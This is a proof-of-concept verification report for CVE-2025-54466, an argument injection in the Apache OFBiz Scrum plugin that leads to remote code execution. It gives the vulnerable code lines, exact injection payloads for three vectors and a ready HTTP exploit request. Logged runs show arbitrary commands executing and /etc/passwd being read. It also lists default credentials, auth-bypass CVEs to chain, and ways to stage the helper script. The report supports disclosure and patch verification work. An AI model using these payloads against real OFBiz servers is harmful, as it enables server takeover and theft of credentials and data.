# PoC Verification Report: CVE-2025-54466

## Verification Status: ✅ CONFIRMED

**CVE:** CVE-2025-54466
**Vulnerability:** Apache OFBiz Scrum Plugin — SVN Argument Injection to Remote Code Execution
**CVSS:** 9.8 CRITICAL (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
**Affected:** Apache OFBiz < 24.09.02 (with scrum plugin enabled)

---

## PoC Scripts

| Script | Location | Vector | Status |
|---|---|---|---|
| `poc.py` | `poc/poc.py` | RCE via `svn diff --diff-cmd` | ✅ CONFIRMED |
| `poc_vector2.py` | `poc/poc_vector2.py` | RCE via `svn log --diff --diff-cmd` | ✅ CONFIRMED |
| `poc_vector3.py` | `poc/poc_vector3.py` | Argument injection proof via `--xml` | ✅ CONFIRMED |

---

## Vulnerability Demonstrated

The PoC proves **Remote Code Execution (RCE)** through the Apache OFBiz Scrum plugin's `viewScrumRevision()` service. The attack exploits SVN argument injection via Java's `Runtime.exec(String)` whitespace tokenization.

**Root Cause:** The `repository` HTTP parameter is concatenated directly into `svn` command strings and passed to `Runtime.getRuntime().exec(String)`. Java's `exec(String)` tokenizes by whitespace using `StringTokenizer`, so injected tokens become additional arguments to the `svn` binary.

**Attack Mechanism:** SVN's `--diff-cmd=<binary>` flag specifies an external program to execute when displaying file differences. By injecting this flag via the `repository` parameter, the attacker causes SVN to invoke an arbitrary binary, achieving Remote Code Execution.

**In-Band Output:** The executed command's stdout is captured by SVN and returned to OFBiz, which renders it in the HTTP response body via the FreeMarker template's `<pre>${result.diffMessage}</pre>` tag. This makes the vulnerability an **in-band RCE** where the attacker receives command output directly in the HTTP response.

---

## Test Environment

| Property | Value |
|---|---|
| **Container** | `cve-2025-54466-vulnerable` |
| **Image** | Built from source at `release24.09.01` |
| **Software** | Apache OFBiz 24.09.01 + ofbiz-plugins (scrum) |
| **Container IP** | Dynamic (on `lab-net` network) |
| **Port** | 8443 (HTTPS, self-signed cert) |
| **Credentials** | `admin` / `ofbiz` (demo data) |
| **SVN Repo** | `file:///home/ofbiz/svnrepo` (3 revisions) |
| **SVN Working Copy** | `/home/ofbiz/svnwc` |
| **Execution Context** | `uid=1001(ofbiz) gid=1001(ofbiz)` |

---

## Vector 1: Primary RCE via `svn diff --diff-cmd` (poc.py)

### Description

Exploits the `svn diff` command in `viewScrumRevision()` (line 150-151 of `ScrumServices.java`):
```java
String diffCommand = "svn diff -r" + Integer.toString((Integer.parseInt(revision.trim()) - 1))
    + ":" + revision + " " + repository;
Process diffProcess = Runtime.getRuntime().exec(diffCommand);
```

Payload: `repository=--diff-cmd=/tmp/.ofbiz_rce_helper.sh /home/ofbiz/svnwc`

Resulting command after tokenization:
```
["svn", "diff", "-r1:2", "--diff-cmd=/tmp/.ofbiz_rce_helper.sh", "/home/ofbiz/svnwc"]
```

### Command and Output

```
$ python3 poc.py localhost 8443 -c "id"

======================================================================
CVE-2025-54466: Apache OFBiz Scrum Plugin — RCE via SVN Argument Injection
======================================================================
[*] Target: https://localhost:8443
[*] Command: id

[*] Authenticating as 'admin' to https://localhost:8443/scrum/control/login
[+] Authentication successful — session established

[*] Staging helper script at /tmp/.ofbiz_rce_helper.sh
[+] Helper script staged at /tmp/.ofbiz_rce_helper.sh

[*] Triggering SVN argument injection via viewScrumRevision()...
[*] Sending exploit to: /scrum/control/RevisionInfo
[*] Payload: repository=--diff-cmd=/tmp/.ofbiz_rce_helper.sh /home/ofbiz/svnwc
[*] Resulting svn command: svn diff -r1:2 --diff-cmd=/tmp/.ofbiz_rce_helper.sh /home/ofbiz/svnwc

======================================================================
[+] ✅ EXPLOIT SUCCESSFUL — Command output received in HTTP response:
======================================================================

uid=1001(ofbiz) gid=1001(ofbiz) groups=1001(ofbiz)

======================================================================
[+] Demonstrated: Remote Code Execution as OFBiz service account
[+] Vector: SVN --diff-cmd argument injection via 'repository' parameter
[+] In-band output: Command output returned in HTTP response body
```

### Additional Test — Arbitrary Command Execution

```
$ python3 poc.py localhost 8443 -c "whoami; uname -a; cat /etc/hostname"

[+] ✅ EXPLOIT SUCCESSFUL — Command output received in HTTP response:

ofbiz
Linux 8c52c41b0c8a 6.12.69-linuxkit #1 SMP Mon Feb 16 11:19:06 UTC 2026 aarch64 aarch64 aarch64 GNU/Linux
8c52c41b0c8a
```

### Additional Test — Sensitive File Read

```
$ python3 poc.py localhost 8443 -c "cat /etc/passwd | head -5"

[+] ✅ EXPLOIT SUCCESSFUL — Command output received in HTTP response:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
```

---

## Vector 2: RCE via `svn log --diff --diff-cmd` (poc_vector2.py)

### Description

Exploits the `svn log` command in `viewScrumRevision()` (line 143-144):
```java
String logCommand = "svn log -r" + revision + " " + repository;
Process logProcess = Runtime.getRuntime().exec(logCommand);
```

By injecting `--diff --diff-cmd=<script>`, the `svn log` command is told to show inline diffs using a custom diff program. This exploits a **different code path** (the `svn log` call vs. the `svn diff` call).

Payload: `repository=--diff --diff-cmd=/tmp/.ofbiz_rce_helper_v2.sh /home/ofbiz/svnwc`

Resulting command after tokenization:
```
["svn", "log", "-r2", "--diff", "--diff-cmd=/tmp/.ofbiz_rce_helper_v2.sh", "/home/ofbiz/svnwc"]
```

### Command and Output

```
$ python3 poc_vector2.py localhost 8443 -c "id"

======================================================================
CVE-2025-54466 Vector 2: RCE via 'svn log --diff --diff-cmd'
======================================================================
[*] Target: https://localhost:8443
[*] Command: id
[*] Vector: svn log (logMessage output)

[*] Authenticating as 'admin'...
[+] Authentication successful

[+] Helper script staged at /tmp/.ofbiz_rce_helper_v2.sh

[*] Sending exploit request...
[*] Payload: repository=--diff --diff-cmd=/tmp/.ofbiz_rce_helper_v2.sh /home/ofbiz/svnwc
[*] Resulting svn command: svn log -r2 --diff --diff-cmd=/tmp/.ofbiz_rce_helper_v2.sh /home/ofbiz/svnwc

======================================================================
[+] ✅ VECTOR 2 SUCCESSFUL — Command output in logMessage:
======================================================================

------------------------------------------------------------------------
r2 | ofbiz | 2026-03-01 00:54:43 +0000 (Sun, 01 Mar 2026) | 1 line

Second commit

Index: /home/ofbiz/svnwc/test.txt
===================================================================
uid=1001(ofbiz) gid=1001(ofbiz) groups=1001(ofbiz)

------------------------------------------------------------------------

======================================================================
[+] Demonstrated: RCE via 'svn log --diff --diff-cmd' injection
[+] Output location: logMessage (PRE TAG 1), not diffMessage
```

**Key Difference from Vector 1:** The command output appears in `logMessage` (PRE TAG 1) instead of `diffMessage` (PRE TAG 2), proving that the `svn log` command on line 143-144 is independently exploitable from the `svn diff` command on line 150-151.

---

## Vector 3: Argument Injection Proof via `--xml` (poc_vector3.py)

### Description

This is a **non-RCE** proof that definitively demonstrates argument injection. By injecting `--xml` into the repository parameter, the `svn log` output format changes from plain text to XML. The output format change is visible in the HTTP response, proving that user input is injected as command-line arguments.

Payload: `repository=--xml /home/ofbiz/svnwc`

Resulting command: `svn log -r2 --xml /home/ofbiz/svnwc`

### Command and Output

```
$ python3 poc_vector3.py localhost 8443

======================================================================
CVE-2025-54466 Vector 3: SVN Argument Injection Proof (--xml)
======================================================================
[*] Target: https://localhost:8443
[*] Injection: repository=--xml /home/ofbiz/svnwc

[*] Authenticating as 'admin'...
[+] Authentication successful

[*] Step 1: Fetching normal (non-injected) log output as baseline...
[*] Normal logMessage output: -----------------------------------------------
r2 | ofbiz | 2026-03-01 00:54:43 +0000 (Sun, 01 Mar 2026) | 1 line

Second commit

[*] Step 2: Injecting --xml flag to change svn output format...
[*] Payload: repository=--xml /home/ofbiz/svnwc
[*] Resulting command: svn log -r2 --xml /home/ofbiz/svnwc
[*] Expected: XML-formatted output instead of plain text

======================================================================
[+] ✅ ARGUMENT INJECTION CONFIRMED — XML output detected:
======================================================================

Normal output format (plain text):
  r2 | ofbiz | 2026-03-01 ... | Second commit

Injected output format (XML):
  <?xml version="1.0" encoding="UTF-8"?>
  <log>
  <logentry revision="2">
  <author>ofbiz</author>
  <date>2026-03-01T00:54:43.358380Z</date>
  <msg>Second commit</msg>
  </logentry>
  </log>

======================================================================
[+] Proof: The '--xml' flag was injected into the svn command
[+]   Normal: svn log -r2 /home/ofbiz/svnwc → plain text
[+]   Injected: svn log -r2 --xml /home/ofbiz/svnwc → XML output
[+] Impact: Attacker controls svn command-line flags
[+] Escalation: Use --diff-cmd=<binary> for RCE (see poc.py)
```

---

## Attack Summary

### HTTP Request (Exploit Trigger)

```http
GET /scrum/control/RevisionInfo?revision=2&repository=--diff-cmd%3D/tmp/.ofbiz_rce_helper.sh%20/home/ofbiz/svnwc HTTP/1.1
Host: localhost:8443
Cookie: JSESSIONID=<session_cookie>; scrum.securedLoginId=admin
```

### Injection Flow

```
User Input:    repository = "--diff-cmd=/tmp/helper.sh /home/ofbiz/svnwc"
                              ↓
Java Code:     "svn diff -r1:2 " + repository
             = "svn diff -r1:2 --diff-cmd=/tmp/helper.sh /home/ofbiz/svnwc"
                              ↓
Runtime.exec:  StringTokenizer splits by whitespace →
               ["svn", "diff", "-r1:2", "--diff-cmd=/tmp/helper.sh", "/home/ofbiz/svnwc"]
                              ↓
SVN Client:    Executes /tmp/helper.sh as the external diff program
                              ↓
Output:        helper.sh stdout → captured by SVN → returned to Java → diffMessage
             → rendered in HTTP response via <pre>${result.diffMessage}</pre>
```

### Authentication Requirement

The PoC uses **demo credentials** (`admin`/`ofbiz`) loaded from OFBiz demo data. In production scenarios:

1. **Default credentials** — Many OFBiz deployments run with demo data
2. **View override bypass** (OFBiz < 18.12.16) — Unauthenticated via `ListLocales/RevisionInfo` URI chaining
3. **Auth bypass chains** — Can be combined with CVE-2023-51467, CVE-2024-38856, or CVE-2024-45195

### Helper Script Requirement

SVN's `--diff-cmd` passes extra arguments (`-u -L label1 -L label2 file1 file2`) to the specified binary. Most standard binaries fail with these unexpected arguments. A shell script wrapper that ignores SVN's arguments is required for reliable arbitrary command execution.

In a real attack, the helper script can be staged via:
- File upload functionality in OFBiz
- Writable web directory
- SVN `--config-dir` pointing to attacker-controlled config with hooks
- Chaining with another vulnerability that provides file write

### OFBiz `file://` URL Bug

OFBiz's `UtilHttp.canonicalizeParameterMap()` crashes with `IndexOutOfBoundsException` when parameter values contain `file://` URLs. The PoC uses the SVN working copy path (`/home/ofbiz/svnwc`) instead of `file:///home/ofbiz/svnrepo`.

---

## Notes and Observations

1. **In-Band RCE**: This is a clean in-band RCE — command output is directly visible in the HTTP response body, making data exfiltration trivial.

2. **Two Independent Injection Points**: Both `svn log` (line 143) and `svn diff` (line 150) in `viewScrumRevision()` are exploitable independently, via different SVN flag combinations.

3. **No Public Exploits Exist**: This is an original PoC — no prior public exploit code was found in ExploitDB, Metasploit, GitHub, or other tracked sources.

4. **Execution Context**: Commands execute as `uid=1001(ofbiz)`, the OFBiz service account. This provides access to OFBiz configuration, database credentials, and the application's classpath.

5. **SVN Client Dependency**: The vulnerability requires the `svn` client to be installed in the OFBiz container. Without it, `Runtime.exec()` fails with "No such file or directory". However, the scrum plugin's functionality inherently requires SVN, making this a reasonable expectation.

6. **Stable and Repeatable**: The exploit is deterministic and succeeds consistently across multiple test runs.
